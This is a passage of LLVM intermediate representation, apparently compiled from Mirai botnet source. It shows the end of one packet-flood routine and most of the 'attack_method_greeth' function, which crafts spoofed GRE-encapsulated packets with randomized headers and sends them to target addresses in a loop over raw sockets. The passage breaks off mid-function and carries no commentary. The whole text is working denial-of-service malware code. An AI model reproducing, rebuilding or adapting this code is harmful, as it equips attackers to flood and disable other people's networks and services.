; <label>:155:                                    ; preds = %153, %151
  %.sink = phi i32 [ %154, %153 ], [ %152, %151 ]
  %156 = getelementptr inbounds i8, i8* %116, i64 40
  %157 = bitcast i8* %156 to i32*
  store i32 %.sink, i32* %157, align 4
  %158 = call zeroext i16 @htons(i16 zeroext %18) #8
  %159 = bitcast i8* %120 to i16*
  store i16 %158, i16* %159, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %20) #8
  %161 = getelementptr inbounds i8, i8* %116, i64 46
  %162 = bitcast i8* %161 to i16*
  store i16 %160, i16* %162, align 2
  %163 = call zeroext i16 @htons(i16 zeroext %43) #8
  %164 = getelementptr inbounds i8, i8* %116, i64 48
  %165 = bitcast i8* %164 to i16*
  store i16 %163, i16* %165, align 2
  %166 = load i32, i32* %5, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %5, align 4
  %168 = icmp slt i32 %167, %34
  br i1 %168, label %.lr.ph127.split, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %229
  br label %.loopexit.backedge

.loopexit.loopexit136:                            ; preds = %315
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit136
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %105, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %229
  %storemerge124126.us = phi i32 [ %256, %229 ], [ 0, %.lr.ph.split.us.preheader ]
  %169 = sext i32 %storemerge124126.us to i64
  %170 = getelementptr inbounds i8*, i8** %8, i64 %169
  %171 = load i8*, i8** %170, align 8
  %172 = getelementptr inbounds i8, i8* %171, i64 24
  %173 = bitcast i8* %172 to %struct.iphdr*
  %174 = getelementptr inbounds i8, i8* %171, i64 44
  %175 = getelementptr inbounds i8, i8* %171, i64 52
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %169, i32 2
  %177 = load i8, i8* %176, align 4
  %178 = icmp ult i8 %177, 32
  br i1 %178, label %179, label %194

; <label>:179:                                    ; preds = %.lr.ph.split.us
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %169, i32 1
  %181 = load i32, i32* %180, align 4
  %182 = call i32 @ntohl(i32 %181) #8
  %183 = call i32 @rand_next() #7
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %185, i32 2
  %187 = load i8, i8* %186, align 4
  %188 = zext i8 %187 to i32
  %189 = lshr i32 %183, %188
  %190 = add i32 %189, %182
  %191 = call i32 @htonl(i32 %190) #8
  %192 = getelementptr inbounds i8, i8* %171, i64 16
  %193 = bitcast i8* %192 to i32*
  store i32 %191, i32* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %.lr.ph.split.us, %179
  %195 = call i32 @rand_next() #7
  %196 = getelementptr inbounds i8, i8* %171, i64 12
  %197 = bitcast i8* %196 to i32*
  store i32 %195, i32* %197, align 4
  br i1 %107, label %198, label %207

; <label>:198:                                    ; preds = %194
  %199 = call i32 @rand_next() #7
  %200 = trunc i32 %199 to i16
  %201 = getelementptr inbounds i8, i8* %171, i64 4
  %202 = bitcast i8* %201 to i16*
  store i16 %200, i16* %202, align 4
  %203 = sub i32 999, %199
  %204 = trunc i32 %203 to i16
  %205 = getelementptr inbounds i8, i8* %171, i64 28
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %198, %194
  br i1 %109, label %208, label %212

; <label>:208:                                    ; preds = %207
  %209 = call i32 @rand_next() #7
  %210 = trunc i32 %209 to i16
  %211 = bitcast i8* %174 to i16*
  store i16 %210, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %208, %207
  br i1 %111, label %213, label %218

; <label>:213:                                    ; preds = %212
  %214 = call i32 @rand_next() #7
  %215 = trunc i32 %214 to i16
  %216 = getelementptr inbounds i8, i8* %171, i64 46
  %217 = bitcast i8* %216 to i16*
  store i16 %215, i16* %217, align 2
  br label %218

; <label>:218:                                    ; preds = %213, %212
  br i1 %112, label %223, label %219

; <label>:219:                                    ; preds = %218
  %220 = getelementptr inbounds i8, i8* %171, i64 16
  %221 = bitcast i8* %220 to i32*
  %222 = load i32, i32* %221, align 4
  br label %225

; <label>:223:                                    ; preds = %218
  %224 = call i32 @rand_next() #7
  br label %225

; <label>:225:                                    ; preds = %223, %219
  %.sink3.us = phi i32 [ %222, %219 ], [ %224, %223 ]
  %226 = getelementptr inbounds i8, i8* %171, i64 40
  %227 = bitcast i8* %226 to i32*
  store i32 %.sink3.us, i32* %227, align 4
  br i1 %113, label %229, label %228

; <label>:228:                                    ; preds = %225
  call void @rand_str(i8* nonnull %175, i32 %21) #7
  br label %229

; <label>:229:                                    ; preds = %228, %225
  %230 = getelementptr inbounds i8, i8* %171, i64 10
  %231 = bitcast i8* %230 to i16*
  store i16 0, i16* %231, align 2
  %232 = bitcast i8* %171 to i16*
  %233 = call zeroext i16 @checksum_generic(i16* %232, i32 20) #7
  store i16 %233, i16* %231, align 2
  %234 = getelementptr inbounds i8, i8* %171, i64 34
  %235 = bitcast i8* %234 to i16*
  store i16 0, i16* %235, align 2
  %236 = bitcast i8* %172 to i16*
  %237 = call zeroext i16 @checksum_generic(i16* %236, i32 20) #7
  store i16 %237, i16* %235, align 2
  %238 = getelementptr inbounds i8, i8* %171, i64 50
  %239 = bitcast i8* %238 to i16*
  store i16 0, i16* %239, align 2
  %240 = getelementptr inbounds i8, i8* %171, i64 48
  %241 = bitcast i8* %240 to i16*
  %242 = load i16, i16* %241, align 2
  %243 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %173, i8* nonnull %174, i16 zeroext %242, i32 %114) #7
  store i16 %243, i16* %239, align 2
  %244 = load i32, i32* %5, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %245, i32 0, i32 0
  store i16 2, i16* %246, align 4
  %247 = getelementptr inbounds i8, i8* %171, i64 16
  %248 = bitcast i8* %247 to i32*
  %249 = load i32, i32* %248, align 4
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %245, i32 0, i32 2, i32 0
  store i32 %249, i32* %250, align 4
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %245, i32 0, i32 1
  store i16 0, i16* %251, align 2
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %245, i32 0
  %253 = bitcast %struct.sockaddr_in* %252 to %struct.sockaddr*
  %254 = call i64 @sendto(i32 %28, i8* nonnull %171, i64 %.pre130, i32 16384, %struct.sockaddr* %253, i32 16) #7
  %255 = load i32, i32* %5, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %5, align 4
  %257 = icmp slt i32 %256, %34
  br i1 %257, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %315
  %storemerge124126 = phi i32 [ %342, %315 ], [ 0, %.lr.ph.split.preheader ]
  %258 = sext i32 %storemerge124126 to i64
  %259 = getelementptr inbounds i8*, i8** %8, i64 %258
  %260 = load i8*, i8** %259, align 8
  %261 = getelementptr inbounds i8, i8* %260, i64 24
  %262 = bitcast i8* %261 to %struct.iphdr*
  %263 = getelementptr inbounds i8, i8* %260, i64 44
  %264 = getelementptr inbounds i8, i8* %260, i64 52
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %258, i32 2
  %266 = load i8, i8* %265, align 4
  %267 = icmp ult i8 %266, 32
  br i1 %267, label %268, label %283

; <label>:268:                                    ; preds = %.lr.ph.split
  %269 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %258, i32 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @ntohl(i32 %270) #8
  %272 = call i32 @rand_next() #7
  %273 = load i32, i32* %5, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %274, i32 2
  %276 = load i8, i8* %275, align 4
  %277 = zext i8 %276 to i32
  %278 = lshr i32 %272, %277
  %279 = add i32 %278, %271
  %280 = call i32 @htonl(i32 %279) #8
  %281 = getelementptr inbounds i8, i8* %260, i64 16
  %282 = bitcast i8* %281 to i32*
  store i32 %280, i32* %282, align 4
  br label %283

; <label>:283:                                    ; preds = %.lr.ph.split, %268
  br i1 %107, label %284, label %293

; <label>:284:                                    ; preds = %283
  %285 = call i32 @rand_next() #7
  %286 = trunc i32 %285 to i16
  %287 = getelementptr inbounds i8, i8* %260, i64 4
  %288 = bitcast i8* %287 to i16*
  store i16 %286, i16* %288, align 4
  %289 = sub i32 999, %285
  %290 = trunc i32 %289 to i16
  %291 = getelementptr inbounds i8, i8* %260, i64 28
  %292 = bitcast i8* %291 to i16*
  store i16 %290, i16* %292, align 4
  br label %293

; <label>:293:                                    ; preds = %284, %283
  br i1 %109, label %294, label %298

; <label>:294:                                    ; preds = %293
  %295 = call i32 @rand_next() #7
  %296 = trunc i32 %295 to i16
  %297 = bitcast i8* %263 to i16*
  store i16 %296, i16* %297, align 2
  br label %298

; <label>:298:                                    ; preds = %294, %293
  br i1 %111, label %299, label %304

; <label>:299:                                    ; preds = %298
  %300 = call i32 @rand_next() #7
  %301 = trunc i32 %300 to i16
  %302 = getelementptr inbounds i8, i8* %260, i64 46
  %303 = bitcast i8* %302 to i16*
  store i16 %301, i16* %303, align 2
  br label %304

; <label>:304:                                    ; preds = %299, %298
  br i1 %112, label %305, label %307

; <label>:305:                                    ; preds = %304
  %306 = call i32 @rand_next() #7
  br label %311

; <label>:307:                                    ; preds = %304
  %308 = getelementptr inbounds i8, i8* %260, i64 16
  %309 = bitcast i8* %308 to i32*
  %310 = load i32, i32* %309, align 4
  br label %311

; <label>:311:                                    ; preds = %307, %305
  %.sink3 = phi i32 [ %310, %307 ], [ %306, %305 ]
  %312 = getelementptr inbounds i8, i8* %260, i64 40
  %313 = bitcast i8* %312 to i32*
  store i32 %.sink3, i32* %313, align 4
  br i1 %113, label %315, label %314

; <label>:314:                                    ; preds = %311
  call void @rand_str(i8* nonnull %264, i32 %21) #7
  br label %315

; <label>:315:                                    ; preds = %311, %314
  %316 = getelementptr inbounds i8, i8* %260, i64 10
  %317 = bitcast i8* %316 to i16*
  store i16 0, i16* %317, align 2
  %318 = bitcast i8* %260 to i16*
  %319 = call zeroext i16 @checksum_generic(i16* %318, i32 20) #7
  store i16 %319, i16* %317, align 2
  %320 = getelementptr inbounds i8, i8* %260, i64 34
  %321 = bitcast i8* %320 to i16*
  store i16 0, i16* %321, align 2
  %322 = bitcast i8* %261 to i16*
  %323 = call zeroext i16 @checksum_generic(i16* %322, i32 20) #7
  store i16 %323, i16* %321, align 2
  %324 = getelementptr inbounds i8, i8* %260, i64 50
  %325 = bitcast i8* %324 to i16*
  store i16 0, i16* %325, align 2
  %326 = getelementptr inbounds i8, i8* %260, i64 48
  %327 = bitcast i8* %326 to i16*
  %328 = load i16, i16* %327, align 2
  %329 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %262, i8* nonnull %263, i16 zeroext %328, i32 %114) #7
  store i16 %329, i16* %325, align 2
  %330 = load i32, i32* %5, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %331, i32 0, i32 0
  store i16 2, i16* %332, align 4
  %333 = getelementptr inbounds i8, i8* %260, i64 16
  %334 = bitcast i8* %333 to i32*
  %335 = load i32, i32* %334, align 4
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %331, i32 0, i32 2, i32 0
  store i32 %335, i32* %336, align 4
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %331, i32 0, i32 1
  store i16 0, i16* %337, align 2
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %331, i32 0
  %339 = bitcast %struct.sockaddr_in* %338 to %struct.sockaddr*
  %340 = call i64 @sendto(i32 %28, i8* nonnull %260, i64 %.pre130, i32 16384, %struct.sockaddr* %339, i32 16) #7
  %341 = load i32, i32* %5, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %5, align 4
  %343 = icmp slt i32 %342, %34
  br i1 %343, label %.lr.ph.split, label %.loopexit.loopexit136

; <label>:344:                                    ; preds = %4, %103
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #7
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %280, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #7
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %109, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  %.pre = sext i32 %24 to i64
  %.pre136 = add nsw i64 %.pre, 66
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = trunc i64 %.pre136 to i16
  %40 = icmp eq i8 %19, 0
  %41 = add nsw i64 %.pre, 28
  %42 = trunc i64 %41 to i16
  %43 = xor i16 %15, -1
  %44 = icmp eq i8 %28, 0
  %45 = add nsw i64 %.pre, 8
  %46 = trunc i64 %45 to i16
  br i1 %40, label %.lr.ph134.split.preheader, label %.lr.ph134.split.us.preheader

.lr.ph134.split.us.preheader:                     ; preds = %.lr.ph134
  br label %.lr.ph134.split.us

.lr.ph134.split.preheader:                        ; preds = %.lr.ph134
  br label %.lr.ph134.split

.lr.ph134.split.us:                               ; preds = %.lr.ph134.split.us.preheader, %95
  %47 = phi i32 [ %107, %95 ], [ 0, %.lr.ph134.split.us.preheader ]
  %48 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %49 = sext i32 %47 to i64
  %50 = getelementptr inbounds i8*, i8** %11, i64 %49
  store i8* %48, i8** %50, align 8
  %51 = getelementptr inbounds i8, i8* %48, i64 38
  %52 = getelementptr inbounds i8, i8* %48, i64 58
  store i8 69, i8* %48, align 4
  %53 = getelementptr inbounds i8, i8* %48, i64 1
  store i8 %13, i8* %53, align 1
  %54 = call zeroext i16 @htons(i16 zeroext %39) #8
  %55 = getelementptr inbounds i8, i8* %48, i64 2
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %15) #8
  %58 = getelementptr inbounds i8, i8* %48, i64 4
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 4
  %60 = getelementptr inbounds i8, i8* %48, i64 8
  store i8 %17, i8* %60, align 4
  %61 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %62 = getelementptr inbounds i8, i8* %48, i64 6
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = getelementptr inbounds i8, i8* %48, i64 9
  store i8 47, i8* %64, align 1
  %65 = getelementptr inbounds i8, i8* %48, i64 12
  %66 = bitcast i8* %65 to i32*
  store i32 %30, i32* %66, align 4
  %67 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %49, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8, i8* %48, i64 16
  %70 = bitcast i8* %69 to i32*
  store i32 %68, i32* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext 25944) #8
  %72 = getelementptr inbounds i8, i8* %48, i64 22
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %75 = getelementptr inbounds i8, i8* %48, i64 36
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 1
  store i8 69, i8* %51, align 4
  %77 = getelementptr inbounds i8, i8* %48, i64 39
  store i8 %13, i8* %77, align 1
  %78 = call zeroext i16 @htons(i16 zeroext %42) #8
  %79 = getelementptr inbounds i8, i8* %48, i64 40
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  %81 = call zeroext i16 @htons(i16 zeroext %43) #8
  %82 = getelementptr inbounds i8, i8* %48, i64 42
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 4
  %84 = getelementptr inbounds i8, i8* %48, i64 46
  store i8 %17, i8* %84, align 4
  %85 = getelementptr inbounds i8, i8* %48, i64 44
  %86 = bitcast i8* %85 to i16*
  store i16 %61, i16* %86, align 2
  %87 = getelementptr inbounds i8, i8* %48, i64 47
  store i8 17, i8* %87, align 1
  %88 = call i32 @rand_next() #7
  %89 = getelementptr inbounds i8, i8* %48, i64 50
  %90 = bitcast i8* %89 to i32*
  store i32 %88, i32* %90, align 4
  br i1 %44, label %93, label %91

; <label>:91:                                     ; preds = %.lr.ph134.split.us
  %92 = load i32, i32* %70, align 4
  br label %95

; <label>:93:                                     ; preds = %.lr.ph134.split.us
  %94 = sub i32 1023, %88
  br label %95

; <label>:95:                                     ; preds = %93, %91
  %.sink.us = phi i32 [ %94, %93 ], [ %92, %91 ]
  %96 = getelementptr inbounds i8, i8* %48, i64 54
  %97 = bitcast i8* %96 to i32*
  store i32 %.sink.us, i32* %97, align 4
  %98 = call zeroext i16 @htons(i16 zeroext %21) #8
  %99 = bitcast i8* %52 to i16*
  store i16 %98, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext %23) #8
  %101 = getelementptr inbounds i8, i8* %48, i64 60
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 2
  %103 = call zeroext i16 @htons(i16 zeroext %46) #8
  %104 = getelementptr inbounds i8, i8* %48, i64 62
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = load i32, i32* %5, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %5, align 4
  %108 = icmp slt i32 %107, %37
  br i1 %108, label %.lr.ph134.split.us, label %.preheader.loopexit140

; <label>:109:                                    ; preds = %33
  %110 = call i32 @close(i32 %31) #7
  br label %280

.preheader.loopexit:                              ; preds = %168
  br label %.preheader

.preheader.loopexit140:                           ; preds = %95
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit140, %.preheader.loopexit, %.preheader132
  %111 = icmp eq i32 %30, -1
  %112 = and i32 %14, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %20, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %22, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i8 %28, 0
  %119 = bitcast i32* %6 to i8*
  %120 = bitcast i32* %7 to i8*
  %121 = bitcast i32* %8 to i8*
  %122 = getelementptr inbounds i8, i8* %121, i64 2
  %123 = icmp eq i8 %26, 0
  %124 = add i32 %24, 8
  br label %.loopexit

.lr.ph134.split:                                  ; preds = %.lr.ph134.split.preheader, %168
  %125 = phi i32 [ %180, %168 ], [ 0, %.lr.ph134.split.preheader ]
  %126 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %127 = sext i32 %125 to i64
  %128 = getelementptr inbounds i8*, i8** %11, i64 %127
  store i8* %126, i8** %128, align 8
  %129 = getelementptr inbounds i8, i8* %126, i64 38
  %130 = getelementptr inbounds i8, i8* %126, i64 58
  store i8 69, i8* %126, align 4
  %131 = getelementptr inbounds i8, i8* %126, i64 1
  store i8 %13, i8* %131, align 1
  %132 = call zeroext i16 @htons(i16 zeroext %39) #8
  %133 = getelementptr inbounds i8, i8* %126, i64 2
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = call zeroext i16 @htons(i16 zeroext %15) #8
  %136 = getelementptr inbounds i8, i8* %126, i64 4
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 4
  %138 = getelementptr inbounds i8, i8* %126, i64 8
  store i8 %17, i8* %138, align 4
  %139 = getelementptr inbounds i8, i8* %126, i64 9
  store i8 47, i8* %139, align 1
  %140 = getelementptr inbounds i8, i8* %126, i64 12
  %141 = bitcast i8* %140 to i32*
  store i32 %30, i32* %141, align 4
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %127, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = getelementptr inbounds i8, i8* %126, i64 16
  %145 = bitcast i8* %144 to i32*
  store i32 %143, i32* %145, align 4
  %146 = call zeroext i16 @htons(i16 zeroext 25944) #8
  %147 = getelementptr inbounds i8, i8* %126, i64 22
  %148 = bitcast i8* %147 to i16*
  store i16 %146, i16* %148, align 2
  %149 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %150 = getelementptr inbounds i8, i8* %126, i64 36
  %151 = bitcast i8* %150 to i16*
  store i16 %149, i16* %151, align 1
  store i8 69, i8* %129, align 4
  %152 = getelementptr inbounds i8, i8* %126, i64 39
  store i8 %13, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %42) #8
  %154 = getelementptr inbounds i8, i8* %126, i64 40
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %43) #8
  %157 = getelementptr inbounds i8, i8* %126, i64 42
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %126, i64 46
  store i8 %17, i8* %159, align 4
  %160 = getelementptr inbounds i8, i8* %126, i64 47
  store i8 17, i8* %160, align 1
  %161 = call i32 @rand_next() #7
  %162 = getelementptr inbounds i8, i8* %126, i64 50
  %163 = bitcast i8* %162 to i32*
  store i32 %161, i32* %163, align 4
  br i1 %44, label %166, label %164

; <label>:164:                                    ; preds = %.lr.ph134.split
  %165 = load i32, i32* %145, align 4
  br label %168

; <label>:166:                                    ; preds = %.lr.ph134.split
  %167 = sub i32 1023, %161
  br label %168

; <label>:168:                                    ; preds = %166, %164
  %.sink = phi i32 [ %167, %166 ], [ %165, %164 ]
  %169 = getelementptr inbounds i8, i8* %126, i64 54
  %170 = bitcast i8* %169 to i32*
  store i32 %.sink, i32* %170, align 4
  %171 = call zeroext i16 @htons(i16 zeroext %21) #8
  %172 = bitcast i8* %130 to i16*
  store i16 %171, i16* %172, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %23) #8
  %174 = getelementptr inbounds i8, i8* %126, i64 60
  %175 = bitcast i8* %174 to i16*
  store i16 %173, i16* %175, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %46) #8
  %177 = getelementptr inbounds i8, i8* %126, i64 62
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 2
  %179 = load i32, i32* %5, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %5, align 4
  %181 = icmp slt i32 %180, %37
  br i1 %181, label %.lr.ph134.split, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %251
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %38, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %251
  %storemerge131133 = phi i32 [ %278, %251 ], [ 0, %.lr.ph.preheader ]
  %182 = sext i32 %storemerge131133 to i64
  %183 = getelementptr inbounds i8*, i8** %11, i64 %182
  %184 = load i8*, i8** %183, align 8
  %185 = getelementptr inbounds i8, i8* %184, i64 24
  %186 = getelementptr inbounds i8, i8* %184, i64 38
  %187 = bitcast i8* %186 to %struct.iphdr*
  %188 = getelementptr inbounds i8, i8* %184, i64 58
  %189 = getelementptr inbounds i8, i8* %184, i64 66
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = icmp ult i8 %191, 32
  br i1 %192, label %193, label %208

; <label>:193:                                    ; preds = %.lr.ph
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #8
  %197 = call i32 @rand_next() #7
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %199, i32 2
  %201 = load i8, i8* %200, align 4
  %202 = zext i8 %201 to i32
  %203 = lshr i32 %197, %202
  %204 = add i32 %203, %196
  %205 = call i32 @htonl(i32 %204) #8
  %206 = getelementptr inbounds i8, i8* %184, i64 16
  %207 = bitcast i8* %206 to i32*
  store i32 %205, i32* %207, align 4
  br label %208

; <label>:208:                                    ; preds = %193, %.lr.ph
  br i1 %111, label %209, label %213

; <label>:209:                                    ; preds = %208
  %210 = call i32 @rand_next() #7
  %211 = getelementptr inbounds i8, i8* %184, i64 12
  %212 = bitcast i8* %211 to i32*
  store i32 %210, i32* %212, align 4
  br label %213

; <label>:213:                                    ; preds = %209, %208
  br i1 %113, label %214, label %223

; <label>:214:                                    ; preds = %213
  %215 = call i32 @rand_next() #7
  %216 = trunc i32 %215 to i16
  %217 = getelementptr inbounds i8, i8* %184, i64 4
  %218 = bitcast i8* %217 to i16*
  store i16 %216, i16* %218, align 4
  %219 = sub i32 999, %215
  %220 = trunc i32 %219 to i16
  %221 = getelementptr inbounds i8, i8* %184, i64 42
  %222 = bitcast i8* %221 to i16*
  store i16 %220, i16* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %214, %213
  br i1 %115, label %224, label %228

; <label>:224:                                    ; preds = %223
  %225 = call i32 @rand_next() #7
  %226 = trunc i32 %225 to i16
  %227 = bitcast i8* %188 to i16*
  store i16 %226, i16* %227, align 2
  br label %228

; <label>:228:                                    ; preds = %224, %223
  br i1 %117, label %229, label %234

; <label>:229:                                    ; preds = %228
  %230 = call i32 @rand_next() #7
  %231 = trunc i32 %230 to i16
  %232 = getelementptr inbounds i8, i8* %184, i64 60
  %233 = bitcast i8* %232 to i16*
  store i16 %231, i16* %233, align 2
  br label %234

; <label>:234:                                    ; preds = %229, %228
  br i1 %118, label %235, label %237

; <label>:235:                                    ; preds = %234
  %236 = call i32 @rand_next() #7
  br label %241

; <label>:237:                                    ; preds = %234
  %238 = getelementptr inbounds i8, i8* %184, i64 16
  %239 = bitcast i8* %238 to i32*
  %240 = load i32, i32* %239, align 4
  br label %241

; <label>:241:                                    ; preds = %237, %235
  %.sink3 = phi i32 [ %240, %237 ], [ %236, %235 ]
  %242 = getelementptr inbounds i8, i8* %184, i64 54
  %243 = bitcast i8* %242 to i32*
  store i32 %.sink3, i32* %243, align 4
  %244 = call i32 @rand_next() #7
  store i32 %244, i32* %6, align 4
  %245 = call i32 @rand_next() #7
  store i32 %245, i32* %7, align 4
  %246 = call i32 @rand_next() #7
  store i32 %246, i32* %8, align 4
  call void @util_memcpy(i8* %185, i8* nonnull %119, i32 4) #7
  %247 = getelementptr inbounds i8, i8* %184, i64 30
  call void @util_memcpy(i8* %247, i8* nonnull %120, i32 4) #7
  %248 = getelementptr inbounds i8, i8* %184, i64 28
  call void @util_memcpy(i8* %248, i8* nonnull %121, i32 2) #7
  %249 = getelementptr inbounds i8, i8* %184, i64 34
